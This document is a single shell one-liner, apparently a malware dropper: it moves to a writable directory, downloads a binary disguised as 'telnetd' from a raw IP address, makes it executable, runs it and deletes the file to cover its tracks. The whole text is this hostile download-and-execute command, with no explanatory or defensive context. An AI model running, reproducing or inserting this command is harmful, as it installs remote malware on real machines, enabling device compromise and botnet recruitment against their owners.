cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.91.119.2/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
